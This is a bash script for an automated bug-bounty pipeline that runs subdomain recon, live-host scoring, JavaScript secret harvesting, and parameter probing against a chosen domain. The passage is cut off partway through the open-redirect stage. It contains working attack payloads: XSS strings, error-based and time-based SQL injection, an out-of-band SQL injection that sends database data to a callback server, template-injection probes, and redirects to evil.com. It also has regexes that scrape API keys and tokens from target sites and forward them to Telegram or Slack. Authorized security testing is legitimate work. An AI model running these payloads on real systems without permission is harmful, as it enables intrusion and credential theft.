#!/bin/bash
# ═══════════════════════════════════════════════════════════════════════
#  BUG HUNTER MASTER PIPELINE v2.0
#  Purpose : Full automated recon → JS hunt → param → BAC → monitor
#  Usage   : ./bug_hunter_pipeline.sh -d target.com [OPTIONS]
#  ⚠️  Run ONLY on authorized targets. Unauthorized use is illegal.
# ═══════════════════════════════════════════════════════════════════════

# set -euo pipefail

# ── Colors ──────────────────────────────────────────────────────────────
RED='\033[0;31m';  GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m';  PURPLE='\033[0;35m'
WHITE='\033[1;37m'; BOLD='\033[1m';    RESET='\033[0m'

# ── Default Config ───────────────────────────────────────────────────────
TARGET=""
USER_TOKEN=""
COLLAB_SERVER=""
TELEGRAM_TOKEN=""
TELEGRAM_CHAT_ID=""
SLACK_WEBHOOK=""
OUTPUT_DIR=""
THREADS=50
RATE_LIMIT=100
SKIP_MONITOR=false
SKIP_REPORT=false
ONLY_RECON=false
VERBOSE=false
RESUME=false
MODE="full"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/tmp/pipeline_init.log"
START_TIME=$SECONDS

# ── Banner ───────────────────────────────────────────────────────────────
print_banner() {
  echo -e "${RED}"
  cat << 'BANNER'
██████╗ ██╗   ██╗ ██████╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
██╔══██╗██║   ██║██╔════╝     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝██║   ██║██║  ███╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██╔══██╗██║   ██║██║   ██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝╚██████╔╝    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
╚═════╝  ╚═════╝  ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
BANNER
  echo -e "${CYAN}        ┌──────────────────────────────────────────────────────┐"
  echo -e "        │   Master Bug Hunting Pipeline  v2.0                  │"
  echo -e "        │   Recon ➜ JS Hunt ➜ Param ➜ BAC ➜ Monitor ➜ Report  │"
  echo -e "        └──────────────────────────────────────────────────────┘${RESET}"
  echo ""
}

# ── Help ─────────────────────────────────────────────────────────────────
print_help() {
  echo -e "${BOLD}USAGE:${RESET}  $0 -d <domain> [OPTIONS]\n"
  echo -e "${BOLD}REQUIRED:${RESET}"
  echo -e "  -d  <domain>        Target domain (e.g. example.com)\n"
  echo -e "${BOLD}AUTH & OOB:${RESET}"
  echo -e "  -t  <jwt_token>     JWT token for authenticated testing (BAC/IDOR)"
  echo -e "  -c  <collab_url>    OOB server (interactsh/burp) for blind vulns\n"
  echo -e "${BOLD}NOTIFICATIONS:${RESET}"
  echo -e "  -T  <tg_token>      Telegram bot token"
  echo -e "  -C  <chat_id>       Telegram chat ID"
  echo -e "  -S  <webhook_url>   Slack incoming webhook URL\n"
  echo -e "${BOLD}EXECUTION:${RESET}"
  echo -e "  -m  <mode>          Mode: full | recon | hunt | monitor (default: full)"
  echo -e "  -o  <dir>           Custom output directory"
  echo -e "  -x  <num>           Threads (default: 50)"
  echo -e "  -r  <num>           Rate limit req/s (default: 100)"
  echo -e "  --skip-monitor      Skip cron monitor setup"
  echo -e "  --skip-report       Skip HTML report generation"
  echo -e "  --only-recon        Exit after Phase 1"
  echo -e "  --resume            Resume from existing output dir"
  echo -e "  -v                  Verbose output"
  echo -e "  -h                  Show this help\n"
  echo -e "${BOLD}MODES:${RESET}"
  echo -e "  full      All 5 phases (default)"
  echo -e "  recon     Phase 1 only — subdomain + live hosts"
  echo -e "  hunt      Phase 2+3+4 only — needs prior recon output"
  echo -e "  monitor   Phase 5 only — setup/refresh cron monitor\n"
  echo -e "${BOLD}EXAMPLES:${RESET}"
  echo -e "  # Minimal (just recon)"
  echo -e "  $0 -d target.com -m recon\n"
  echo -e "  # Full pipeline with notifications"
  echo -e "  $0 -d target.com -t 'eyJhbGc...' -c 'abc.oast.fun' \\"
  echo -e "       -T '110201543:AAHdqT' -C '1234567890'\n"
  echo -e "  # Fast recon, custom threads"
  echo -e "  $0 -d target.com -x 100 -r 200 --skip-monitor\n"
  echo -e "  # Hunt only (recon already done)"
  echo -e "  $0 -d target.com -m hunt -o ./hunt_target.com_20240101\n"
}

# ── Argument Parsing ──────────────────────────────────────────────────────
parse_args() {
  [[ $# -eq 0 ]] && { print_banner; print_help; exit 0; }
  while [[ $# -gt 0 ]]; do
    case $1 in
      -d)  TARGET="${2:?'-d requires a domain'}";         shift 2 ;;
      -t)  USER_TOKEN="${2:?'-t requires a token'}";      shift 2 ;;
      -c)  COLLAB_SERVER="${2:?'-c requires a URL'}";     shift 2 ;;
      -T)  TELEGRAM_TOKEN="${2:?'-T requires a token'}";  shift 2 ;;
      -C)  TELEGRAM_CHAT_ID="${2:?'-C requires chat_id'}";shift 2 ;;
      -S)  SLACK_WEBHOOK="${2:?'-S requires a URL'}";     shift 2 ;;
      -o)  OUTPUT_DIR="${2:?'-o requires a directory'}";  shift 2 ;;
      -r)  RATE_LIMIT="${2:?'-r requires a number'}";     shift 2 ;;
      -x)  THREADS="${2:?'-x requires a number'}";        shift 2 ;;
      -m)  MODE="${2:?'-m requires a mode'}";             shift 2 ;;
      --skip-monitor) SKIP_MONITOR=true; shift ;;
      --skip-report)  SKIP_REPORT=true;  shift ;;
      --only-recon)   ONLY_RECON=true;   shift ;;
      --resume)       RESUME=true;       shift ;;
      -v)  VERBOSE=true;  shift ;;
      -h)  print_banner; print_help; exit 0 ;;
      *)   echo -e "${RED}[ERROR] Unknown option: $1${RESET}"; exit 1 ;;
    esac
  done
}

# ── Logging ───────────────────────────────────────────────────────────────
log() {
  local LEVEL=$1; shift
  local MSG="$*"
  local COLOR PREFIX
  case $LEVEL in
    INFO)    COLOR=$CYAN;   PREFIX="[*]" ;;
    SUCCESS) COLOR=$GREEN;  PREFIX="[+]" ;;
    WARN)    COLOR=$YELLOW; PREFIX="[!]" ;;
    ERROR)   COLOR=$RED;    PREFIX="[-]" ;;
    STAGE)   COLOR=$PURPLE; PREFIX="[»]" ;;
    FIND)    COLOR=$WHITE;  PREFIX="[🎯]";;
  esac
  echo -e "${COLOR}${PREFIX} ${MSG}${RESET}"
  echo "[$(date '+%H:%M:%S')] [$LEVEL] $MSG" >> "$LOG_FILE"
}

progress_bar() {
  # usage: progress_bar "label" current total
  local LABEL=$1 CURRENT=$2 TOTAL=$3
  local PCT=0
  [[ $TOTAL -gt 0 ]] && PCT=$(( CURRENT * 100 / TOTAL ))
  local FILLED=$(( PCT / 5 )) BAR=""
  for ((i=0;i<20;i++)); do
    [[ $i -lt $FILLED ]] && BAR+="█" || BAR+="░"
  done
  printf "\r${CYAN}  [%s] %3d%%  %s${RESET}   " "$BAR" "$PCT" "$LABEL"
}

# ── Notifications ─────────────────────────────────────────────────────────
notify() {
  local SEVERITY=$1 MSG=$2 EMOJI
  case $SEVERITY in
    CRITICAL) EMOJI="🚨" ;;  HIGH)    EMOJI="🔥" ;;
    MEDIUM)   EMOJI="⚠️"  ;;  INFO)    EMOJI="ℹ️"  ;;
    SUCCESS)  EMOJI="✅" ;;
  esac
  local FULL="${EMOJI} [${SEVERITY}] ${MSG}"
  log FIND "$FULL"
  if [[ -n "$TELEGRAM_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
    curl -s "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
      --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" \
      --data-urlencode "text=${FULL}" \
      --data-urlencode "parse_mode=HTML" > /dev/null 2>&1 || true
  fi
  if [[ -n "$SLACK_WEBHOOK" ]]; then
    curl -s -X POST "$SLACK_WEBHOOK" \
      -H 'Content-type: application/json' \
      -d "{\"text\":\"${FULL}\"}" > /dev/null 2>&1 || true
  fi
}

# ── Tool Check + Install Guide ────────────────────────────────────────────
check_tools() {
  log STAGE "Checking tools..."
  local REQUIRED=(subfinder httpx gau curl python3 openssl dig sort)
  local OPTIONAL=(amass assetfinder gowitness wafw00f katana uro gf qsreplace anew)
  local MISSING=()

  for t in "${REQUIRED[@]}"; do
    if ! command -v "$t" &>/dev/null; then
      MISSING+=("$t")
      echo -e "  ${RED}✗ $t  [REQUIRED — NOT FOUND]${RESET}"
    else
      $VERBOSE && echo -e "  ${GREEN}✓ $t${RESET}"
    fi
  done

  for t in "${OPTIONAL[@]}"; do
    if ! command -v "$t" &>/dev/null; then
      echo -e "  ${YELLOW}○ $t  [optional — some features disabled]${RESET}"
    else
      $VERBOSE && echo -e "  ${GREEN}✓ $t${RESET}"
    fi
  done

  if [[ ${#MISSING[@]} -gt 0 ]]; then
    echo ""
    log ERROR "Missing required tools: ${MISSING[*]}"
    echo -e "${YELLOW}  Install guide:${RESET}"
    echo -e "  ${CYAN}# Go tools (subfinder, httpx, gau, anew, uro, gf, qsreplace)${RESET}"
    echo -e "  go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    echo -e "  go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
    echo -e "  go install github.com/lc/gau/v2/cmd/gau@latest"
    echo -e "  go install github.com/tomnomnom/anew@latest"
    echo -e "  go install github.com/tomnomnom/uro@latest"
    echo -e "  go install github.com/tomnomnom/gf@latest"
    echo -e "  go install github.com/tomnomnom/qsreplace@latest"
    echo -e "  ${CYAN}# Or run the bundled installer:${RESET}"
    echo -e "  bash install_tools.sh"
    exit 1
  fi
  log SUCCESS "All required tools found"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 1 — RECONNAISSANCE
# ═══════════════════════════════════════════════════════════════════════════
phase_recon() {
  log STAGE "══════════════════════════════════════════════════════"
  log STAGE " PHASE 1/5 — RECONNAISSANCE"
  log STAGE "══════════════════════════════════════════════════════"

  local R="$OUTPUT_DIR/01_recon"
  mkdir -p "$R"/{subs,live,cloud,certs,ports}

  # ── 1.1 Multi-source Subdomain Collection ──────────────────────
  log INFO "Multi-source subdomain enumeration..."

  subfinder -d "$TARGET" -silent -all 2>/dev/null \
    > "$R/subs/subfinder.txt" || touch "$R/subs/subfinder.txt"

  command -v assetfinder &>/dev/null && \
    assetfinder --subs-only "$TARGET" 2>/dev/null \
    > "$R/subs/assetfinder.txt" || touch "$R/subs/assetfinder.txt"

  # crt.sh
  curl -s --max-time 20 "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null | \
    python3 -c "
import json,sys
try:
  data=json.load(sys.stdin)
  seen=set()
  for d in data:
    for n in d.get('name_value','').split('\n'):
      n=n.strip().lstrip('*.')
      if n and '.' in n and n not in seen:
        seen.add(n); print(n)
except: pass
" 2>/dev/null > "$R/subs/crtsh.txt" || touch "$R/subs/crtsh.txt"

  # Wayback CDX subdomains
  curl -s --max-time 20 \
    "http://web.archive.org/cdx/search/cdx?url=*.$TARGET&output=text&fl=original&collapse=urlkey&limit=3000" \
    2>/dev/null | grep -oE "[a-zA-Z0-9._-]+\.$TARGET" 2>/dev/null | sort -u \
    > "$R/subs/wayback_subs.txt" || touch "$R/subs/wayback_subs.txt"

  cat "$R/subs/"*.txt | grep -E "^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$" | \
    sort -u > "$R/all_subs.txt"

  local TOTAL_SUBS
  TOTAL_SUBS=$(wc -l < "$R/all_subs.txt")
  log SUCCESS "Total unique subdomains collected: ${TOTAL_SUBS}"

  # ── 1.2 Live Host Detection ────────────────────────────────────
  log INFO "Live host detection + tech fingerprinting (threads: $THREADS)..."
  httpx -l "$R/all_subs.txt" \
        -silent -status-code -title -tech-detect \
        -content-length -follow-redirects \
        -threads "$THREADS" -rate-limit "$RATE_LIMIT" \
        -o "$R/live/live_hosts.txt" 2>/dev/null || true

  local TOTAL_LIVE
  TOTAL_LIVE=$(wc -l < "$R/live/live_hosts.txt" 2>/dev/null || echo 0)
  log SUCCESS "Live hosts found: ${TOTAL_LIVE}"

  # ── 1.3 Juicy Target Scoring ────────────────────────────────────
  log INFO "Scoring juicy targets..."
  : > "$R/live/scored_targets.txt"
  while IFS= read -r line; do
    local SCORE=0
    local HOST
    HOST=$(echo "$line" | awk '{print $1}')
    echo "$HOST" | grep -qiE "admin|portal|manage"       && SCORE=$((SCORE+10))
    echo "$HOST" | grep -qiE "\bapi\b|graphql|rest|v[0-9]" && SCORE=$((SCORE+8))
    echo "$HOST" | grep -qiE "dev|staging|uat|test|qa"   && SCORE=$((SCORE+7))
    echo "$HOST" | grep -qiE "internal|intra|corp|local"  && SCORE=$((SCORE+9))
    echo "$HOST" | grep -qiE "jenkins|gitlab|jira|github|bitbucket" && SCORE=$((SCORE+10))
    echo "$HOST" | grep -qiE "vpn|remote|rdp|ssh|ftp"    && SCORE=$((SCORE+8))
    echo "$HOST" | grep -qiE "backup|old|legacy|archive"  && SCORE=$((SCORE+6))
    echo "$HOST" | grep -qiE "pay|payment|checkout|billing" && SCORE=$((SCORE+9))
    echo "$line"  | grep -q   " 200 "                     && SCORE=$((SCORE+5))
    echo "$line"  | grep -qE  " 401 | 403 "               && SCORE=$((SCORE+3))
    printf "%03d | %s\n" "$SCORE" "$line"
  done < "$R/live/live_hosts.txt" | sort -rn > "$R/live/scored_targets.txt"

  log SUCCESS "Top 10 juicy targets:"
  head -10 "$R/live/scored_targets.txt" | while IFS= read -r l; do
    echo -e "  ${CYAN}→${RESET} $l"
  done

  # ── 1.4 Cloud Asset Detection ───────────────────────────────────
  log INFO "Cloud asset detection (S3 / Azure / GCP)..."
  while IFS= read -r sub; do
    local RESP
    RESP=$(curl -sk --max-time 5 "https://$sub" 2>/dev/null | head -c 800)
    echo "$RESP" | grep -qi "NoSuchBucket\|AmazonS3\|s3.amazonaws.com" && \
      echo "[S3-BUCKET] $sub" >> "$R/cloud/s3.txt"
    echo "$sub"   | grep -qi "blob.core.windows.net" && \
      echo "[AZURE-BLOB] $sub" >> "$R/cloud/azure.txt"
    echo "$sub"   | grep -qi "storage.googleapis.com" && \
      echo "[GCP-STORAGE] $sub" >> "$R/cloud/gcp.txt"
    # Open S3 check
    local S3_STATUS
    S3_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
      "https://${sub}.s3.amazonaws.com/" 2>/dev/null)
    [[ "$S3_STATUS" =~ ^(200|403)$ ]] && \
      echo "[S3-GUESS:$S3_STATUS] $sub.s3.amazonaws.com" >> "$R/cloud/s3.txt"
  done < "$R/all_subs.txt"

  # ── 1.5 SSL Certificate Analysis ────────────────────────────────
  log INFO "SSL certificate analysis (first 100 hosts)..."
  head -100 "$R/all_subs.txt" | while IFS= read -r sub; do
    {
      echo | timeout 5 openssl s_client -connect "$sub:443" 2>/dev/null | \
        openssl x509 -noout -subject -issuer -dates 2>/dev/null | \
        awk -v h="$sub" '{print h" | "$0}'
    } >> "$R/certs/ssl_info.txt" 2>/dev/null || true
  done

  # ── 1.6 Quick Port Scan (top ports on juicy targets) ────────────
  log INFO "Quick port scan on top 20 juicy targets..."
  head -20 "$R/live/scored_targets.txt" | awk -F'| ' '{print $2}' | \
    awk '{print $1}' | sed 's|https\?://||' | cut -d/ -f1 | \
    sort -u > "$R/ports/top_hosts.txt"

  if command -v nmap &>/dev/null && [[ -s "$R/ports/top_hosts.txt" ]]; then
    nmap -iL "$R/ports/top_hosts.txt" \
      --top-ports 100 -T4 --open -oN "$R/ports/nmap_results.txt" \
      2>/dev/null || true
  fi

  # ── Save stats ──────────────────────────────────────────────────
  echo "TOTAL_SUBS=${TOTAL_SUBS}"   >> "$OUTPUT_DIR/stats.env"
  echo "TOTAL_LIVE=${TOTAL_LIVE}"   >> "$OUTPUT_DIR/stats.env"
  log SUCCESS "Phase 1 complete ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 2 — JAVASCRIPT SECRET HUNTER
# ═══════════════════════════════════════════════════════════════════════════
phase_js_hunter() {
  log STAGE "══════════════════════════════════════════════════════"
  log STAGE " PHASE 2/5 — JAVASCRIPT SECRET HUNTER"
  log STAGE "══════════════════════════════════════════════════════"

  local J="$OUTPUT_DIR/02_js_hunter"
  mkdir -p "$J"/{files,secrets,endpoints,sourcemaps}
  touch "$J/sourcemaps/found.txt" "$J/sourcemaps/original_sources.txt"

  # ── 2.1 JS File Collection ──────────────────────────────────────
  log INFO "Collecting JS files from GAU + Wayback..."
  {
    echo "https://$TARGET" | gau \
      --blacklist png,jpg,gif,css,woff,svg,ttf,ico,eot,mp4,mp3,pdf 2>/dev/null | \
      grep -E "\.js(\?|$)" || true

    curl -s --max-time 20 \
      "http://web.archive.org/cdx/search/cdx?url=*.$TARGET/*.js&output=text&fl=original&collapse=urlkey&limit=2000" \
      2>/dev/null || true
  } | sort -u > "$J/files/all_js.txt"

  local JS_TOTAL
  JS_TOTAL=$(wc -l < "$J/files/all_js.txt")
  log SUCCESS "JS files found: $JS_TOTAL"

  # ── 2.2 40-Pattern Secret Scan ──────────────────────────────────
  log INFO "Running 40+ pattern secret scan..."

  declare -A PATTERNS=(
    [AWS_ACCESS_KEY]='AKIA[0-9A-Z]{16}'
    [AWS_SECRET]='(?i)aws.{0,20}secret.{0,10}[=:].{0,5}[A-Za-z0-9/+=]{40}'
    [GOOGLE_API]='AIza[0-9A-Za-z_-]{35}'
    [GITHUB_TOKEN]='gh[pousr]_[A-Za-z0-9_]{36,255}'
    [STRIPE_LIVE]='sk_live_[0-9a-zA-Z]{24,}'
    [STRIPE_TEST]='sk_test_[0-9a-zA-Z]{24,}'
    [TWILIO_SID]='AC[a-z0-9]{32}'
    [TWILIO_TOKEN]='SK[a-z0-9]{32}'
    [SENDGRID_KEY]='SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}'
    [JWT]='eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
    [PRIVATE_KEY]='-----BEGIN.{0,20}PRIVATE KEY-----'
    [FIREBASE_URL]='[A-Za-z0-9_-]+\.firebaseio\.com'
    [FIREBASE_KEY]='[Ff]irebase.{0,20}[Kk]ey.{0,5}[=:].{0,5}[A-Za-z0-9_-]{30,}'
    [SLACK_TOKEN]='xox[baprs]-[0-9A-Za-z-]{20,}'
    [SLACK_WEBHOOK_URL]='hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+'
    [MAILGUN_KEY]='key-[0-9a-zA-Z]{32}'
    [PAYPAL_TOKEN]='access_token\$production\$[0-9a-z]{16}'
    [HEROKU_KEY]='[hH]eroku.{0,20}[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}'
    [SHOPIFY_TOKEN]='shpat_[A-Za-z0-9]{32}'
    [DISCORD_TOKEN]='(Bot|Bearer)\s+[MN][A-Za-z0-9]{23}\.[A-Za-z0-9-]{6}\.[A-Za-z0-9_-]{27}'
    [MAPBOX_TOKEN]='pk\.[a-zA-Z0-9]{60,}\.[a-zA-Z0-9_-]{22}'
    [ALGOLIA_KEY]='(?i)algolia.{0,20}[=:].{0,5}[A-Za-z0-9]{32}'
    [DATABASE_URL]='(mysql|postgres|mongodb|redis|mssql):\/\/[^\s"'"'"'<]{10,}'
    [PASSWORD_FIELD]='(?i)(password|passwd|secret|api_key)\s*[:=]\s*['"'"'"][^'"'"'"]{6,}'
    [BEARER_TOKEN]='[Bb]earer\s+[A-Za-z0-9\-\._~\+\/]{20,}=*'
    [BASIC_AUTH_URL]='https?://[^:@/\s]{3,30}:[^:@/\s]{3,30}@[a-zA-Z0-9._-]+'
  )

  local SECRETS_COUNT=0
  local JS_DONE=0

  while IFS= read -r js_url; do
    JS_DONE=$((JS_DONE+1))
    progress_bar "Scanning JS files" "$JS_DONE" "$JS_TOTAL"

    local CONTENT
    CONTENT=$(curl -sk --max-time 10 "$js_url" 2>/dev/null) || continue
    [[ -z "$CONTENT" ]] && continue

    for pname in "${!PATTERNS[@]}"; do
      local FOUND
      FOUND=$(echo "$CONTENT" | grep -oP "${PATTERNS[$pname]}" 2>/dev/null | head -2) || \
      FOUND=$(echo "$CONTENT" | grep -oE "${PATTERNS[$pname]}" 2>/dev/null | head -2) || true
      if [[ -n "$FOUND" ]]; then
        {
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo "TYPE  : $pname"
          echo "URL   : $js_url"
          echo "VALUE : $FOUND"
        } >> "$J/secrets/raw_secrets.txt"
        SECRETS_COUNT=$((SECRETS_COUNT+1))
        notify "CRITICAL" "Secret [$pname] found in $js_url"
      fi
    done

    # REST endpoints
    echo "$CONTENT" | \
      grep -oE '"(/[a-zA-Z0-9_/-]{2,100})"' | tr -d '"' | \
      grep -E "^/api|^/v[0-9]|^/admin|^/user|^/auth" \
      >> "$J/endpoints/rest_api.txt" 2>/dev/null || true

    # GraphQL operations
    echo "$CONTENT" | \
      grep -oE '(query|mutation|subscription)\s+[A-Za-z_][A-Za-z0-9_]*' \
      >> "$J/endpoints/graphql_ops.txt" 2>/dev/null || true

    # Hardcoded internal URLs
    echo "$CONTENT" | \
      grep -oE 'https?://[a-zA-Z0-9._/-]{10,200}' | \
      grep -ivE "cdn|fonts|analytics|google|jquery|cloudflare|bootstrap|facebook" \
      >> "$J/endpoints/hardcoded_urls.txt" 2>/dev/null || true

  done < "$J/files/all_js.txt"
  echo ""  # newline after progress bar

  # ── 2.3 Source Map Exploitation ─────────────────────────────────
  log INFO "Source map (.map) hunting..."
  local MAP_COUNT=0
  local js_url MAP_URL STATUS
  while IFS= read -r js_url; do
    MAP_URL="${js_url}.map"
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$MAP_URL" 2>/dev/null) || true
    if [[ "$STATUS" == "200" ]]; then
      echo "$MAP_URL" >> "$J/sourcemaps/found.txt"
      curl -sk "$MAP_URL" 2>/dev/null | python3 -c '
import json,sys
try:
  d=json.load(sys.stdin)
  for s in d.get("sources",[]):
    print(s)
except: pass
' >> "$J/sourcemaps/original_sources.txt" 2>/dev/null || true
      notify "HIGH" "Source map exposed: $MAP_URL"
    fi
  done < <(head -300 "$J/files/all_js.txt")
  MAP_COUNT=$(wc -l < "$J/sourcemaps/found.txt" 2>/dev/null || echo 0)

  # ── Save stats ──────────────────────────────────────────────────
  sort -u "$J/endpoints/rest_api.txt"        -o "$J/endpoints/rest_api.txt"        2>/dev/null || true
  sort -u "$J/endpoints/hardcoded_urls.txt"  -o "$J/endpoints/hardcoded_urls.txt"  2>/dev/null || true

  echo "SECRETS_COUNT=${SECRETS_COUNT}" >> "$OUTPUT_DIR/stats.env"
  echo "MAP_COUNT=${MAP_COUNT}"         >> "$OUTPUT_DIR/stats.env"
  log SUCCESS "Phase 2 complete — Secrets: $SECRETS_COUNT | Source maps: $MAP_COUNT ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 3 — PARAMETER DISCOVERY + VULNERABILITY PROBE
# ═══════════════════════════════════════════════════════════════════════════
phase_param_hunter() {
  log STAGE "══════════════════════════════════════════════════════"
  log STAGE " PHASE 3/5 — PARAMETER DISCOVERY + VULN PROBE"
  log STAGE "══════════════════════════════════════════════════════"

  local P="$OUTPUT_DIR/03_param_hunter"
  mkdir -p "$P"/{urls,xss,sqli,ssti,redirect,other}

  # ── 3.1 URL + Parameter Collection ─────────────────────────────
  log INFO "Collecting parameterized URLs (GAU + Wayback)..."
  {
    echo "https://$TARGET" | gau \
      --blacklist png,jpg,gif,css,woff,svg,ttf,ico,eot,pdf,mp4 2>/dev/null | \
      grep "?" || true

    curl -s --max-time 20 \
      "http://web.archive.org/cdx/search/cdx?url=*.$TARGET/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200&limit=8000" \
      2>/dev/null | grep "?" || true
  } | \
  { command -v uro &>/dev/null && uro || sort -u; } | \
  sort -u > "$P/urls/all_params.txt"

  local PARAM_TOTAL
  PARAM_TOTAL=$(wc -l < "$P/urls/all_params.txt")
  log SUCCESS "Parameterized URLs: $PARAM_TOTAL"

  # ── 3.2 XSS Testing ─────────────────────────────────────────────
  log INFO "XSS — reflection check + payload testing..."

  # Filter XSS candidates
  local XSS_CANDIDATES="$P/urls/xss_candidates.txt"
  if command -v gf &>/dev/null; then
    gf xss < "$P/urls/all_params.txt" > "$XSS_CANDIDATES" 2>/dev/null || \
      cp "$P/urls/all_params.txt" "$XSS_CANDIDATES"
  else
    grep -iE "search=|q=|query=|keyword=|s=|name=|input=|text=" \
      "$P/urls/all_params.txt" > "$XSS_CANDIDATES" || \
      head -500 "$P/urls/all_params.txt" > "$XSS_CANDIDATES"
  fi

  # Reflection probe
  command -v qsreplace &>/dev/null && \
  cat "$XSS_CANDIDATES" | qsreplace 'XSS_REFLECT_TEST_9182' 2>/dev/null | \
    httpx -silent -match-string 'XSS_REFLECT_TEST_9182' \
          -threads "$THREADS" \
          -o "$P/xss/reflected.txt" 2>/dev/null || true

  # Payload confirmation
  local XSS_PAYLOADS=(
    '"><script>alert(document.domain)</script>'
    "'>< svg/onload=alert(1)>"
    '"><img src=x onerror=alert(document.domain)>'
    '"><details open ontoggle=alert(1)>'
  )
  local XSS_COUNT=0
  if [[ -s "$P/xss/reflected.txt" ]] && command -v qsreplace &>/dev/null; then
    while IFS= read -r url; do
      for payload in "${XSS_PAYLOADS[@]}"; do
        local HIT
        HIT=$(echo "$url" | qsreplace "$payload" 2>/dev/null | \
          httpx -silent -match-string "onerror=\|onload=\|<script>\|ontoggle=" \
          -threads 10 2>/dev/null) || true
        if [[ -n "$HIT" ]]; then
          echo "URL     : $url"     >> "$P/xss/confirmed.txt"
          echo "PAYLOAD : $payload" >> "$P/xss/confirmed.txt"
          echo "────────────────"   >> "$P/xss/confirmed.txt"
          XSS_COUNT=$((XSS_COUNT+1))
          notify "HIGH" "XSS Confirmed: $url"
          break
        fi
      done
    done < "$P/xss/reflected.txt"
  fi

  # ── 3.3 SQL Injection ───────────────────────────────────────────
  log INFO "SQLi — error-based + potential blind detection..."

  local SQLI_CANDIDATES="$P/urls/sqli_candidates.txt"
  if command -v gf &>/dev/null; then
    gf sqli < "$P/urls/all_params.txt" > "$SQLI_CANDIDATES" 2>/dev/null || \
      cp "$P/urls/all_params.txt" "$SQLI_CANDIDATES"
  else
    grep -iE "id=|page=|pid=|uid=|cat=|item=|num=" \
      "$P/urls/all_params.txt" > "$SQLI_CANDIDATES" || \
      head -500 "$P/urls/all_params.txt" > "$SQLI_CANDIDATES"
  fi

  # Error-based
  local SQLI_COUNT=0
  command -v qsreplace &>/dev/null && \
  cat "$SQLI_CANDIDATES" | qsreplace "'" 2>/dev/null | \
    httpx -silent \
          -match-string "SQL syntax|mysql_fetch|ORA-[0-9]{4}|pg_query|sqlite3|ODBC Driver|Warning.*mysql" \
          -threads "$THREADS" \
          -o "$P/sqli/error_based.txt" 2>/dev/null || true
  SQLI_COUNT=$(wc -l < "$P/sqli/error_based.txt" 2>/dev/null || echo 0)
  [[ $SQLI_COUNT -gt 0 ]] && notify "CRITICAL" "SQLi error-based hits: $SQLI_COUNT on $TARGET"

  # Time-based blind (small batch — slow)
  command -v qsreplace &>/dev/null && \
  head -100 "$SQLI_CANDIDATES" | qsreplace "' AND SLEEP(5)-- -" 2>/dev/null | \
    httpx -silent -timeout 8 -threads 5 \
          -o "$P/sqli/potential_blind.txt" 2>/dev/null || true

  # OOB SQLi (DNS callback)
  if [[ -n "$COLLAB_SERVER" ]] && command -v qsreplace &>/dev/null; then
    head -50 "$SQLI_CANDIDATES" | \
      qsreplace "' UNION SELECT LOAD_FILE(concat('\\\\\\\\', (SELECT version()), '.${COLLAB_SERVER}\\\\a'))-- -" \
      2>/dev/null | httpx -silent -threads 10 > /dev/null 2>&1 || true
    log INFO "OOB SQLi probes sent — check $COLLAB_SERVER"
  fi

  # ── 3.4 SSTI Testing ────────────────────────────────────────────
  log INFO "SSTI — template injection probing..."
  local SSTI_PAYLOADS=("{{7*7}}" '${7*7}' "#{7*7}" "{{7*'7'}}" "<%= 7*7 %>")
  local SSTI_COUNT=0
  for payload in "${SSTI_PAYLOADS[@]}"; do
    command -v qsreplace &>/dev/null && \
    cat "$P/urls/all_params.txt" | qsreplace "$payload" 2>/dev/null | \
      httpx -silent -match-string "49\|7777777" \
            -threads "$THREADS" \
            -o /tmp/ssti_hits.txt 2>/dev/null || true
    if [[ -s /tmp/ssti_hits.txt ]]; then
      while IFS= read -r hit; do
        echo "PAYLOAD : $payload" >> "$P/ssti/confirmed.txt"
        echo "URL     : $hit"     >> "$P/ssti/confirmed.txt"
        echo "────────────────"   >> "$P/ssti/confirmed.txt"
        SSTI_COUNT=$((SSTI_COUNT+1))
        notify "CRITICAL" "SSTI Confirmed! Payload:$payload URL:$hit"
      done < /tmp/ssti_hits.txt
      rm -f /tmp/ssti_hits.txt
    fi
  done

  # ── 3.5 Open Redirect ───────────────────────────────────────────
  log INFO "Open redirect testing..."
  local REDIR_CANDIDATES="$P/urls/redirect_candidates.txt"
  if command -v gf &>/dev/null; then
    gf redirect < "$P/urls/all_params.txt" > "$REDIR_CANDIDATES" 2>/dev/null || \
      grep -iE "url=|redirect=|next=|return=|redir=|goto=|dest=" \
        "$P/urls/all_params.txt" > "$REDIR_CANDIDATES" || true
  else
    grep -iE "url=|redirect=|next=|return=|redir=|goto=|dest=" \
      "$P/urls/all_params.txt" > "$REDIR_CANDIDATES" || true
  fi

  local REDIR_COUNT=0
  local REDIR_PAYLOADS=("https://evil.com" "//evil.com" "/\\evil.com" "https:evil.com" "///evil.com")
